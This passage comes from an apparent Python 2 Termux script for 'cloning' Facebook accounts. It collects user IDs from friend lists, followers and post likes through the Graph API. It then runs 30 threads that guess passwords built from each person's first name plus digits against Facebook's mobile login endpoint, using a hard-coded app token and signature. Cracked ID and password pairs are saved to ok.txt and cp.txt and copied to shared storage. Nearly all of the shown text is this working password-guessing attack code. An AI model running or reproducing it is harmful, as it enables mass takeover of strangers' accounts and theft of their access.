                print("[1] Input Password  : fristname123 ")
                print("[2] Input Password  : firstname1234")
                print3=raw_input("[3] Input Password : ")
                pass4=raw_input("[4] Input Password  : ")
                pass5=raw_input("[5] Input Password  : ")
                print("--------------------------------------------------")
                try:
                        r = requests.get("https://graph.facebook.com/"+idt+"?access_token="+token, headers=header)
                        q = json.loads(r.text)
                        print("[✓] Account Name : "+q["name"])
                except KeyError:
                        print('\n[!] Error 404 . ID Link '+idt+' Have Privacy On Friendlist OR IS Not Valid')
                        raw_input("\nPress Enter To Back ")
                        randm()
                r = requests.get("https://graph.facebook.com/"+idt+"/friends?access_token="+token, headers=header)
                z = json.loads(r.text)
                for i in z["data"]:
                        uid=i['id']
                        na=i['name']
                        nm=na.rsplit(" ")[0]
                        id.append(uid+'|'+nm)
        elif select =="3":
                os.system("clear")
                print logo
                idt = raw_input("[+] Input ID : ")
                print("--------------------------------------------------")
                print("[1] Input Password  : fristname123 ")
                print("[2] Input Password  : firstname1234")
                print3=raw_input("[3] Input Password : ")
                pass4=raw_input("[4] Input Password  : ")
                pass5=raw_input("[5] Input Password  : ")
                print("--------------------------------------------------")
                try:
                        r = requests.get("https://graph.facebook.com/"+idt+"?access_token="+token, headers=header)
                        q = json.loads(r.text)
                        print("[✓] Account Name : "+q["name"])
                except KeyError:
                        print('\n[!] Error 404 . ID Link '+idt+' Donot Have Followers OR IS Not Valid')
                        raw_input("\nPress Enter To Back ")
                        randm()
                r = requests.get("https://graph.facebook.com/"+idt+"/subscribers?access_token="+token+"&limit=5000", headers=header)
                z = json.loads(r.text)
                for i in z["data"]:
                        uid=i['id']
                        na=i['name']
                        nm=na.rsplit(" ")[0]
                        id.append(uid+'|'+nm)
        elif select =="4":
                os.system("clear")
                print logo
                idt = raw_input("[+] Input Post ID : ")
                print("--------------------------------------------------")
                print("[1] Input Password  : fristname123 ")
                print("[2] Input Password  : firstname1234")
                print3=raw_input("[3] Input Password : ")
                pass4=raw_input("[4] Input Password  : ")
                pass5=raw_input("[5] Input Password  : ")
                print("--------------------------------------------------")
                try:
                        r = requests.get("https://graph.facebook.com/"+idt+"/likes?limit=9999999&access_token="+token, headers=header)
                        z = json.loads(r.text)
                        for i in z["data"]:
                                uid=i['id']
                                na=i['name']
                                nm=na.rsplit(" ")[0]
                                id.append(uid+'|'+nm)
                except KeyError:
                        print('\n[!] Error 404 . Post ID '+idt+' May Not Be Valid')
                        raw_input("\nPress Enter To Back")
                        randm()

        elif select =="0":
                menu()
        else:
                print ("[!] Please Select a Valid Option")
                randmm2()
        print("[+] Total IDs : "+str(len(id)))
        time.sleep(0.5)
        print("[+] Plz Wait Clone Account Will Be Appear Here")
        time.sleep(0.5)
        print("--------------------------------------------------")


        def main(arg):
                user=arg
                uid,name=user.split("|")
                try:
                    pass1=name+"123"
                    q = requests.get("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=" + uid + "&locale=en_US&password=" + pass1 + "&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6", headers=header).text
                    d=json.loads(q)
                    if 'www.facebook.com' in d['error_msg']:
                        print("\033[1;90m[\033[1;92mSuccessful\033[1;90m] "+uid+" "+pass1+" \033[1;97m")
                        cp=open("cp.txt","a")
                        cp.write(uid+" | "+pass1+"\n")
                        cp.close()
                        cps.append(uid)
                    else:
                        if "access_token" in d:
                            print("\033[90m[\033[1;92mSuccessful\033[1;90m]\033[1;97m "+uid+" "+pass1+" \033[1;97m")
                            ok=open("ok.txt","a")
                            ok.write(uid+" | "+pass1+"\n")
                            ok.close()
                            oks.append(uid)
                        else:
                            pass2=name+"1234"
                            q = requests.get("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=" + uid + "&locale=en_US&password=" + pass2 + "&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6", headers=header).text
                            d=json.loads(q)
                            if 'www.facebook.com' in d['error_msg']:
                                print("\033[1;90m[\033[1;92mSuccessful\033[1;90m] "+uid+" "+pass2+" \033[1;97m")
                                cp=open("cp.txt","a")
                                cp.write(uid+" | "+pass2+"\n")
                                cp.close()
                                cps.append(uid)
                            else:
                                if 'access_token' in d:
                                    print("\033[90m[\033[1;92mSuccessful\033[1;90m]\033[1;97m "+uid+" "+pass2+" \033[1;97m")
                                    ok=open("ok.txt","a")
                                    ok.write(uid+" | "+pass2+"\n")
                                    ok.close()
                                    oks.append(uid)
                                else:

                                    q = requests.get("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=" + uid + "&locale=en_US&password=" + pass3 + "&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6", headers=header).text
                                    d=json.loads(q)
                                    if 'www.facebook.com' in d['error_msg']:
                                        print("\033[1;90m[\033[1;92mSuccessful\033[1;90m] "+uid+" "+pass3+" \033[1;97m")
                                        cp=open("cp.txt","a")
                                        cp.write(uid+" | "+pass3+"\n")
                                        cp.close()
                                        cps.append(uid)
                                    else:
                                        if 'access_token' in d:
                                            print("\033[90m[\033[1;92mSuccessful\033[1;90m]\033[1;97m "+uid+" "+pass3+" \033[1;97m")
                                            ok=open("ok.txt","a")
                                            ok.write(uid+" | "+pass3+"\n")
                                            ok.close()
                                            oks.append(uid)
                                        else:

                                            q = requests.get("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=" + uid + "&locale=en_US&password=" + pass4 + "&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6", headers=header).text
                                            d=json.loads(q)
                                            if 'www.facebook.com' in d['error_msg']:
                                                print("\033[1;90m[\033[1;92mSuccessful\033[1;90m] "+uid+" "+pass4+" \033[1;97m")
                                                cp=open("cp.txt","a")
                                                cp.write(uid+" | "+pass4+"\n")
                                                cp.close()
                                                cps.append(uid)
                                            else:
                                                if 'access_token' in d:
                                                    print("\033[90m[\033[1;92mSuccessful\033[1;90m]\033[1;97m "+uid+" "+pass4+" \033[1;97m")
                                                    ok=open("ok.txt","a")
                                                    ok.write(uid+" | "+pass4+"\n")
                                                    ok.close()
                                                    oks.append(uid)
                                                else:

                                                    q = requests.get("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=" + uid + "&locale=en_US&password=" + pass5 + "&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6", headers=header).text
                                                    d=json.loads(q)
                                                    if 'www.facebook.com' in d['error_msg']:
                                                        print("\033[1;90m[\033[1;92mSuccessful\033[1;90m] "+uid+" "+pass5+" \033[1;97m")
                                                        cp=open("cp.txt","a")
                                                        cp.write(uid+" | "+pass5+"\n")
                                                        cp.close()
                                                        cps.append(uid)
                                                    else:
                                                        if 'access_token' in d:
                                                            print("\033[90m[\033[1;92mSuccessful\033[1;90m]\033[1;97m "+uid+" "+pass5+" \033[1;97m")
                                                            ok=open("ok.txt","a")
                                                            ok.write(uid+" | "+pass5+"\n")
                                                            ok.close()
                                                            oks.append(uid)

                except:
                        pass

        p = ThreadPool(30)
        p.map(main, id)
        print("--------------------------------------------------")
        print ('[✓] Process Has Been Completed')
        print('[✓] Total CP/OK:  '+str(len(cps))+'/\033[;32m '+str(len(oks)))
        print("--------------------------------------------------")
        down()
def down():
    dow = raw_input("[?] Do Yoou Want To Download Cp File? (Yes/No) ")
    if dow =="yes" or dow =="y":
        os.system("clear")
        print logo
        download()
        print("[!] Please Give Storage Permission If Ask")
        os.system("termux-setup-storage")
        os.system("cp cp.txt /sdcard")
        print('[✓] File Downloaded Successfully')
        print("[✓] Please Open Your Internal Storage and Rename The File")
        raw_input("Press Enter To Return In Main Menu ")
        crack()
    elif dow =="no" or dow=="n":
        crack()
    else:
        print("[!] Please Select a Valid Option ")
        down()

def morec():
    os.system("clear")
    print logo
    os.system("python3 .loading.md")
    time.sleep(0.0001)
    os.system('clear')
    print logo
    print("[1] Random Bangladesh Cloning")
    print("[2] Random India Cloning")
    print("[0] Back")
    time.sleep(0.5)
    print("--------------------------------------------------")
    morec_man()
def morec_man():
    option = raw_input("\n╰─➣ ")
    if option =="1":
        bangla()
    if option =="2":
        indiaa()
    if option =="0":
          menu()
    else:
          print ("[!] Please Select a Valid Option")
          morec_man()

def bangla():
        global token
        os.system("clear")
        try:
                token=open(".login.txt","r").read()
        except IOError:
                print("[!] Error 404 . Token Not Found")
                os.system("rm -rf .login.txt")
                time.sleep(0.0001)
                login()
        os.system("clear")
        print logo
        print ("[1] Crack From Friend List")
        print ("[2] Crack From Public ID")
        print ("[3] Crack From Followers")
        print ("[4] Crack From Page/Group/ID Post")
        print ('[0] Back')
        print("--------------------------------------------------")
        bangla2()
def bangla2():
        select = raw_input("\n╰─➣ ")
        id=[]
        oks=[]
        cps=[]
        if select=="1":
                os.system("clear")
                print logo
                r = requests.get("https://graph.facebook.com/me/friends?access_token="+token, headers=header)
                z = json.loads(r.text)
                for s in z["data"]:
                        uid=s['id']
                        na=s['name']
                        nm=na.rsplit(" ")[0]
                        id.append(uid+'|'+nm)
        elif select =="2":
                os.system("clear")
                print logo
                idt = raw_input("[+] Input ID/Username : ")
                print("--------------------------------------------------")
                os.system("clear")
                print logo
                try:
                        r = requests.get("https://graph.facebook.com/"+idt+"?access_token="+token, headers=header)
                        q = json.loads(r.text)
                        print("[✓] Account Name : "+q["name"])
                except KeyError:
                        print('\n[!] Error 404 . ID Link '+idt+' Have Privacy On Friendlist OR IS Not Valid')
                        raw_input("\nPress Enter To Back ")
                        crack()
                r = requests.get("https://graph.facebook.com/"+idt+"/friends?access_token="+token, headers=header)
                z = json.loads(r.text)
                for i in z["data"]:
                        uid=i['id']
                        na=i['name']
                        nm=na.rsplit(" ")[0]
                        id.append(uid+'|'+nm)
        elif select =="3":
                os.system("clear")
                print logo
                idt = raw_input("[+] Input ID/Username : ")
                print("--------------------------------------------------")
                os.system("clear")
                print logo
                try:
                        r = requests.get("https://graph.facebook.com/"+idt+"?access_token="+token, headers=header)
                        q = json.loads(r.text)
                        print("[✓] Account Name : "+q["name"])
                except KeyError:
                        print('\n[!] Error 404 . ID Link '+idt+' Donot Have Followers OR IS Not Valid')
                        raw_input("\nPress Enter To Back ")
                        crack()
                r = requests.get("https://graph.facebook.com/"+idt+"/subscribers?access_token="+token+"&limit=5000", headers=header)
                z = json.loads(r.text)
                for i in z["data"]:
                        uid=i['id']
                        na=i['name']
                        nm=na.rsplit(" ")[0]
                        id.append(uid+'|'+nm)
        elif select =="4":
                os.system("clear")
                print logo
                idt = raw_input("[+] Input ID/Username : ")
                print("--------------------------------------------------")
                os.system("clear")
                print logo
                try:
                        r = requests.get("https://graph.facebook.com/"+idt+"/likes?limit=9999999&access_token="+token, headers=header)
                        z = json.loads(r.text)
                        for i in z["data"]:
                                uid=i['id']
                                na=i['name']
                                nm=na.rsplit(" ")[0]
                                id.append(uid+'|'+nm)
                except KeyError:
                        print('\n[!] Error 404 . Post ID '+idt+' May Not Be Valid')
                        raw_input("\nPress Enter To Back")
                        bangla()

        elif select =="0":
                menu()
        else:
                print ("[!] Please Select a Valid Option")
                bangla2()
        print("[+] Total IDs : "+str(len(id)))
        time.sleep(0.5)
        print("[+] Plz Wait Clone Account Will Be Appear Here")
        time.sleep(0.5)
        print("--------------------------------------------------")


        def main(arg):
		user=arg
		uid,name=user.split("|")
		try:
		    pass1=name+"123"
		    q = requests.get("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=" + uid + "&locale=en_US&password=" + pass1 + "&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6", headers=header).text
		    d=json.loads(q)
		    if "access_token" in d:
		       print("\033[90m[\033[1;92mSuccessful\033[1;90m]\033[1;97m "+uid+" "+pass1+" \033[1;97m")
		       ok=open("ok.txt","a")
		       ok.write(uid+" | "+pass1+"\n")
		       ok.close()
		       oks.append(uid)
		    else:
		    	if 'www.facebook.com' in d['error_msg']:
		            print("\033[1;90m[\033[1;92mSuccessful\033[1;90m] "+uid+" "+pass1+" \033[1;97m")
		            cp=open("cp.txt","a")
		            cp.write(uid+" | "+pass1+"\n")
		            cp.close()
		            cps.append(uid)
		        else:
		            pass2=name+"1234"
		            q = requests.get("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=" + uid + "&locale=en_US&password=" + pass2 + "&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6", headers=header).text
		            d=json.loads(q)
		            if 'www.facebook.com' in d['error_msg']:
		                print("\033[1;90m[\033[1;92mSuccessful\033[1;90m] "+uid+" "+pass2+" \033[1;97m")
		                cp=open("cp.txt","a")
		                cp.write(uid+" | "+pass2+"\n")
		                cp.close()
		                cps.append(uid)
		            else:
		                if 'access_token' in d:
		                    print("\033[90m[\033[1;92mSuccessful\033[1;90m]\033[1;97m "+uid+" "+pass2+" \033[1;97m")
		                    ok=open("ok.txt","a")
		                    ok.write(uid+" | "+pass2+"\n")
		                    ok.close()
		                    oks.append(uid)
		                else:
		                    pass3=name+"12345"
		                    q = requests.get("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=" + uid + "&locale=en_US&password=" + pass3 + "&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6", headers=header).text
		                    d=json.loads(q)
		                    if 'www.facebook.com' in d['error_msg']:
		                        print("\033[1;90m[\033[1;92mSuccessful\033[1;90m] "+uid+" "+pass3+" \033[1;97m")
		                        cp=open("cp.txt","a")
		                        cp.write(uid+" | "+pass3+"\n")
		                        cp.close()
		                        cps.append(uid)
		                    else:
		                        if 'access_token' in d:
		                            print("\033[90m[\033[1;92mSuccessful\033[1;90m]\033[1;97m "+uid+" "+pass3+" \033[1;97m")
		                            ok=open("ok.txt","a")
		                            ok.write(uid+" | "+pass3+"\n")
		                            ok.close()
		                            oks.append(uid)
		                        else:
		                            pass4="1122334455"
		                            q = requests.get("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=" + uid + "&locale=en_US&password=" + pass4 + "&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6", headers=header).text
		                            d=json.loads(q)
		                            if 'www.facebook.com' in d['error_msg']:
		                                print("\033[1;90m[\033[1;92mSuccessful\033[1;90m] "+uid+" "+pass4+" \033[1;97m")
		                                cp=open("cp.txt","a")
		                                cp.write(uid+" | "+pass4+"\n")
		                                cp.close()
		                                cps.append(uid)
		                            else:
		                                if 'access_token' in d:
		                                    print("\033[90m[\033[1;92mSuccessful\033[1;90m]\033[1;97m "+uid+" "+pass4+" \033[1;97m")
		                                    ok=open("ok.txt","a")
		                                    ok.write(uid+" | "+pass4+"\n")
		                                    ok.close()
		                                    oks.append(uid)
		                                else:
		                                    pass5="1234554321"
		                                    q = requests.get("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=" + uid + "&locale=en_US&password=" + pass5 + "&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6", headers=header).text
		                                    d=json.loads(q)
		                                    if 'www.facebook.com' in d['error_msg']:
		                                        print("\033[1;90m[\033[1;92mSuccessful\033[1;90m] "+uid+" "+pass5+" \033[1;97m")
		                                        cp=open("cp.txt","a")
		                                        cp.write(uid+" | "+pass5+"\n")
		                                        cp.close()
		                                        cps.append(uid)
		                                    else:
		                                        if 'access_token' in d:
		                                            print("\033[90m[\033[1;92mSuccessful\033[1;90m]\033[1;97m "+uid+" "+pass5+" \033[1;97m")
		                                            ok=open("ok.txt","a")
		                                            ok.write(uid+" | "+pass5+"\n")
		                                            ok.close()
		                                            oks.append(uid)
		                                        else:
		                                            pass6=name+"1212"
		                                            q = requests.get("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=" + uid + "&locale=en_US&password=" + pass6 + "&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6", headers=header).text
		                                            d=json.loads(q)
		                                            if 'www.facebook.com' in d['error_msg']:
		                                                 print("\033[1;90m[\033[1;92mSuccessful\033[1;90m] "+uid+" "+pass6+" \033[1;97m")
		                                                 cp=open("cp.txt","a")
		                                                 cp.write(uid+" | "+pass6+"\n")
		                                                 cp.close()
		                                                 cps.append(uid)
		                                            else:
		                                                if 'access_token' in d:
		                                                    print("\033[90m[\033[1;92mSuccessful\033[1;90m]\033[1;97m "+uid+" "+pass6+" \033[1;97m")
		                                                    ok=open("ok.txt","a")
		                                                    ok.write(uid+" | "+pass6+"\n")
		                                                    ok.close()
		                                                    oks.append(uid)
		                                                else:
		                                                    pass7=name+"123456"
		                                                    q = requests.get("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=" + uid + "&locale=en_US&password=" + pass7 + "&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6", headers=header).text
		                                                    d=json.loads(q)
		                                                    if 'www.facebook.com' in d['error_msg']:
		                                                        print("\033[1;90m[\033[1;92mSuccessful\033[1;90m] "+uid+" "+pass7+" \033[1;97m")
		                                                        cp=open("cp.txt","a")
		                                                        cp.write(uid+" | "+pass7+"\n")
		                                                        cp.close()
		                                                        cps.append(uid)
		                                                    else:
		                                                        if 'access_token' in d:
		                                                            print("\033[90m[\033[1;92mSuccessful\033[1;90m]\033[1;97m "+uid+" "+pass7+" \033[1;97m")
		                                                            ok=open("ok.txt","a")
		                                                            ok.write(uid+" | "+pass7+"\n")
		                                                            ok.close()
		                                                            oks.append(uid)


                except:
                        pass

        p = ThreadPool(30)
        p.map(main, id)
        print("--------------------------------------------------")
        print ('[✓] Process Has Been Completed')
        print('[✓] Total CP/OK:  '+str(len(cps))+'/\033[;32m '+str(len(oks)))
        print("--------------------------------------------------")
        down()
def down():
    dow = raw_input("[?] Do Yoou Want To Download Cp File? (Yes/No) ")
    if dow =="yes" or dow =="y":
        os.system("clear")
        print logo
        download()
        print("[!] Please Give Storage Permission If Ask")
        os.system("termux-setup-storage")
        os.system("cp cp.txt /sdcard")
        print('[✓] File Downloaded Successfully')
        print("[✓] Please Open Your Internal Storage and Rename The File")
        raw_input("Press Enter To Return In Main Menu ")
        crack()
    elif dow =="no" or dow=="n":
        crack()
    else:
        print("[!] Please Select a Valid Option ")
        down()

def indiaa():
        global token
        os.system("clear")
        try:
                token=open(".login.txt","r").read()
        except IOError:
                print("[!] Error 404 . Token Not Found")
                os.system("rm -rf .login.txt")
                time.sleep(0.0001)
                login()
        os.system("clear")
        print logo
        os.system("python3 .loading.md")
        time.sleep(0.0001)
        os.system('clear')
        print logo
        abm ("If you from india, First Use USA proxy to Cloning")
        print("--------------------------------------------------")
        print ("[1] Crack From Friend List")
        print ("[2] Crack From Public ID")
        print ("[3] Crack From Followers")
        print ("[4] Crack From Page/Group/ID Post")
        print ('[0] Back')
        print("--------------------------------------------------")
        indiaa2()
def indiaa2():
        select = raw_input("\n╰─➣ ")
        id=[]
        oks=[]
        cps=[]
        if select=="1":
                os.system("clear")
                print logo
                r = requests.get("https://graph.facebook.com/me/friends?access_token="+token, headers=header)
                z = json.loads(r.text)
                for s in z["data"]:
                        uid=s['id']
                        na=s['name']
                        nm=na.rsplit(" ")[0]
                        id.append(uid+'|'+nm)
        elif select =="2":
                os.system("clear")
                print logo
                idt = raw_input("[+] Input ID/Username : ")
                print("--------------------------------------------------")
                os.system("clear")
                print logo
                try:
                        r = requests.get("https://graph.facebook.com/"+idt+"?access_token="+token, headers=header)
                        q = json.loads(r.text)
                        print("[✓] Account Name : "+q["name"])
                except KeyError:
                        print('\n[!] Error 404 . ID Link '+idt+' Have Privacy On Friendlist OR IS Not Valid')
                        raw_input("\nPress Enter To Back ")
                        indiaa()
                r = requests.get("https://graph.facebook.com/"+idt+"/friends?access_token="+token, headers=header)
                z = json.loads(r.text)
                for i in z["data"]:
                        uid=i['id']
                        na=i['name']
                        nm=na.rsplit(" ")[0]
                        id.append(uid+'|'+nm)
        elif select =="3":
                os.system("clear")
                print logo
                idt = raw_input("[+] Input ID/Username : ")
                print("--------------------------------------------------")
                os.system("clear")
                print logo
                try:
                        r = requests.get("https://graph.facebook.com/"+idt+"?access_token="+token, headers=header)
                        q = json.loads(r.text)
                        print("[✓] Account Name : "+q["name"])
                except KeyError:
                        print('\n[!] Error 404 . ID Link '+idt+' Donot Have Followers OR IS Not Valid')
                        raw_input("\nPress Enter To Back ")
                        crack()
                r = requests.get("https://graph.facebook.com/"+idt+"/subscribers?access_token="+token+"&limit=5000", headers=header)
                z = json.loads(r.text)
                for i in z["data"]:
                        uid=i['id']
                        na=i['name']
                        nm=na.rsplit(" ")[0]
                        id.append(uid+'|'+nm)
        elif select =="4":
                os.system("clear")
                print logo
                idt = raw_input("[+] Input ID/Username : ")
                print("--------------------------------------------------")
                os.system("clear")
                print logo
                try:
                        r = requests.get("https://graph.facebook.com/"+idt+"/likes?limit=9999999&access_token="+token, headers=header)
                        z = json.loads(r.text)
                        for i in z["data"]:
                                uid=i['id']
                                na=i['name']
                                nm=na.rsplit(" ")[0]
                                id.append(uid+'|'+nm)
                except KeyError:
                        print('\n[!] Error 404 . Post ID '+idt+' May Not Be Valid')
                        raw_input("\nPress Enter To Back")
                        indiaa()

        elif select =="0":
                menu()
        else:
                print ("[!] Please Select a Valid Option")
                indiaa()
        print("[+] Total IDs : "+str(len(id)))
        time.sleep(0.5)
        print("[+] Plz Wait Clone Account Will Be Appear Here")
        time.sleep(0.5)
        print("--------------------------------------------------")


        def main(arg):
		user=arg
		uid,name=user.split("|")
		try:
		    pass1=name+"123"
		    q = requests.get("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=" + uid + "&locale=en_US&password=" + pass1 + "&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6", headers=header).text
		    d=json.loads(q)
		    if "access_token" in d:
		       print("\033[90m[\033[1;92mSuccessful\033[1;90m]\033[1;97m "+uid+" "+pass1+" \033[1;97m")
		       ok=open("ok.txt","a")
		       ok.write(uid+" | "+pass1+"\n")
		       ok.close()
		       oks.append(uid)
		    else:
		    	if 'www.facebook.com' in d['error_msg']:
		            print("\033[1;90m[\033[1;92mSuccessful\033[1;90m] "+uid+" "+pass1+" \033[1;97m")
		            cp=open("cp.txt","a")
		            cp.write(uid+" | "+pass1+"\n")
		            cp.close()
		            cps.append(uid)
		        else:
		            pass2=name+"1234"
		            q = requests.get("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=" + uid + "&locale=en_US&password=" + pass2 + "&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6", headers=header).text
		            d=json.loads(q)
		            if 'www.facebook.com' in d['error_msg']:
		                print("\033[1;90m[\033[1;92mSuccessful\033[1;90m] "+uid+" "+pass2+" \033[1;97m")
		                cp=open("cp.txt","a")
		                cp.write(uid+" | "+pass2+"\n")
		                cp.close()
		                cps.append(uid)
		            else:
		                if 'access_token' in d:
		                    print("\033[90m[\033[1;92mSuccessful\033[1;90m]\033[1;97m "+uid+" "+pass2+" \033[1;97m")
		                    ok=open("ok.txt","a")
		                    ok.write(uid+" | "+pass2+"\n")
		                    ok.close()
		                    oks.append(uid)
		                else:
		                    pass3=name+"12345"
		                    q = requests.get("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=" + uid + "&locale=en_US&password=" + pass3 + "&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6", headers=header).text
		                    d=json.loads(q)
		                    if 'www.facebook.com' in d['error_msg']:
		                        print("\033[1;90m[\033[1;92mSuccessful\033[1;90m] "+uid+" "+pass3+" \033[1;97m")
		                        cp=open("cp.txt","a")
		                        cp.write(uid+" | "+pass3+"\n")
		                        cp.close()
		                        cps.append(uid)
		                    else:
		                        if 'access_token' in d:
		                            print("\033[90m[\033[1;92mSuccessful\033[1;90m]\033[1;97m "+uid+" "+pass3+" \033[1;97m")
		                            ok=open("ok.txt","a")
		                            ok.write(uid+" | "+pass3+"\n")
		                            ok.close()
		                            oks.append(uid)
		                        else:
		                            pass4=name+"1212"
		                            q = requests.get("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=" + uid + "&locale=en_US&password=" + pass4 + "&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6", headers=header).text
		                            d=json.loads(q)
		                            if 'www.facebook.com' in d['error_msg']:
		                                print("\033[1;90m[\033[1;92mSuccessful\033[1;90m] "+uid+" "+pass4+" \033[1;97m")
		                                cp=open("cp.txt","a")
		                                cp.write(uid+" | "+pass4+"\n")
		                                cp.close()
		                                cps.append(uid)
		                            else:
		                                if 'access_token' in d:
		                                    print("\033[90m[\033[1;92mSuccessful\033[1;90m]\033[1;97m "+uid+" "+pass4+" \033[1;97m")
		                                    ok=open("ok.txt","a")
		                                    ok.write(uid+" | "+pass4+"\n")
		                                    ok.close()
		                                    oks.append(uid)
		                                else:
		                                    pass5=name+"123456789"
		                                    q = requests.get("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=" + uid + "&locale=en_US&password=" + pass5 + "&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6", headers=header).text
		                                    d=json.loads(q)
		                                    if 'www.facebook.com' in d['error_msg']:
		                                        print("\033[1;90m[\033[1;92mSuccessful\033[1;90m] "+uid+" "+pass5+" \033[1;97m")
		                                        cp=open("cp.txt","a")
		                                        cp.write(uid+" | "+pass5+"\n")
		                                        cp.close()
		                                        cps.append(uid)
		                                    else:
		                                        if 'access_token' in d:
		                                            print("\033[90m[\033[1;92mSuccessful\033[1;90m]\033[1;97m "+uid+" "+pass5+" \033[1;97m")
		                                            ok=open("ok.txt","a")
		                                            ok.write(uid+" | "+pass5+"\n")
		                                            ok.close()
		                                            oks.append(uid)
		                                        else:
		                                            pass6=name+"12345678"
		                                            q = requests.get("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=" + uid + "&locale=en_US&password=" + pass6 + "&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6", headers=header).text
		                                            d=json.loads(q)
		                                            if 'www.facebook.com' in d['error_msg']:
		                                                 print("\033[1;90m[\033[1;92mSuccessful\033[1;90m] "+uid+" "+pass6+" \033[1;97m")
		                                                 cp=open("cp.txt","a")
		                                                 cp.write(uid+" | "+pass6+"\n")
		                                                 cp.close()
		                                                 cps.append(uid)
		                                            else:
		                                                if 'access_token' in d:
		                                                    print("\033[90m[\033[1;92mSuccessful\033[1;90m]\033[1;97m "+uid+" "+pass6+" \033[1;97m")
		                                                    ok=open("ok.txt","a")
		                                                    ok.write(uid+" | "+pass6+"\n")
		                                                    ok.close()
		                                                    oks.append(uid)
		                                                else:
		                                                    pass7=name+"123456"
		                                                    q = requests.get("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=" + uid + "&locale=en_US&password=" + pass7 + "&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6", headers=header).text
		                                                    d=json.loads(q)
		                                                    if 'www.facebook.com' in d['error_msg']:
		                                                        print("\033[1;90m[\033[1;92mSuccessful\033[1;90m] "+uid+" "+pass7+" \033[1;97m")
		                                                        cp=open("cp.txt","a")
		                                                        cp.write(uid+" | "+pass7+"\n")
		                                                        cp.close()
		                                                        cps.append(uid)
		                                                    else:
		                                                        if 'access_token' in d:
		                                                            print("\033[90m[\033[1;92mSuccessful\033[1;90m]\033[1;97m "+uid+" "+pass7+" \033[1;97m")
		                                                            ok=open("ok.txt","a")
		                                                            ok.write(uid+" | "+pass7+"\n")
		                                                            ok.close()
		                                                            oks.append(uid)



                except:
                        pass

        p = ThreadPool(30)
        p.map(main, id)
        print("--------------------------------------------------")
        print ('[✓] Process Has Been Completed')
        print('[✓] Total CP/OK:  '+str(len(cps))+'/\033[;32m '+str(len(oks)))
        print("--------------------------------------------------")
        down()
def down():
    dow = raw_input("[?] Do Yoou Want To Download Cp File? (Yes/No) ")
    if dow =="yes" or dow =="y":
        os.system("clear")
        print logo
        download()
        print("[!] Please Give Storage Permission If Ask")
        os.system("termux-setup-storage")
        os.system("cp cp.txt /sdcard")
        print('[✓] File Downloaded Successfully')
        print("[✓] Please Open Your Internal Storage and Rename The File")
        raw_input("Press Enter To Return In Main Menu ")
        crack()
    elif dow =="no" or dow=="n":
        crack()
    else:
